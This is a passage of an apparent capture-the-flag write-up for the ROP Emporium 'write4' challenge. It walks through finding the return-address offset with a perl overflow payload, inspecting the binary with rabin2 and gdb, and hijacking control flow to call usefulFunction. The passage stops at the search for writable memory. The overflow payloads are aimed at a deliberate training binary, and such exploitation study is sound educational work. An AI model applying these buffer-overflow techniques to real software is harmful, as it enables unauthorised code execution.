# write4
The challenge is available [here](https://ropemporium.com/challenge/write4.html).

## Black-Box Test
Like in all the challenges so far, we will also conduct a test now to discover the behavior of the software. Afterwards, we will find that the return address index is the same as in the previous challenges.

```
./write432
```
![](./0.png)
```
perl -e 'print "X"x44 . "\xef\xbe\xad\xde"' | ./write432
```
![](./1.png)
```
sudo dmesg -k | tail -2
```
![](./2.png)

## In-depth research
I assume that anyone reading this solution has already read the instructions for the challenge. We will find the address of the `print_file` function in the next command.

```
rabin2 -i write432
```
![](./3.png)

Additionally, we will also find the address of the regular helper function.

```
rabin2 -qs write432 | grep -ve 'imp' -e ' 0 ' -e '_'
```
![](./4.png)

Our goal is to make the call `print_file("flag.txt")`. Is the string "flag.txt" present in the binary? The instructions state that it is not. Let's verify this.

```
rabin2 -z write432
```
![](./5.png)

Indeed, there are no helpful strings. Let's take a look at the `usefulFunction`.

```
gdb write432
```
```
set disassembly-flavor intel
```
```
disas usefulFunction
```
![](./6.png)

To summarize, the `usefulFunction` calls `print_file` with one parameter on the stack. This parameter is the address of the string `"nonexistent"` from the previous image (you can also print it out to confirm). Therefore, `usefulFunction` executes `print_file("nonexistent")`.

To verify this in the best way possible, let's call `usefulFunction`. So let's exit the debugger (with the command `q`) and run the next command.

```
perl -e 'print "X"x44 . "\x2a\x85\x04\x08"' | ./write432
```
![](./7.png)

Okay, let's try again after creating a file named `nonexistent`.

```
echo ABCD > nonexistent
```
```
perl -e 'print "X"x44 . "\x2a\x85\x04\x08"' | ./write432
```
![](./8.png)

Indeed, the file was printed. Now, let's focus on the main issue of the current challenge, which is the absence of the string "flag.txt". To address this, we need to push parts of the string onto the stack and place it somewhere in memory.

This means we need to look for three things:
* a writable memory location
* a gadget that reads bytes from the stack to a register
* and a gadget that writes from a register to memory.

We'll start by searching for a writable memory location.

```
readelf -S write432
```
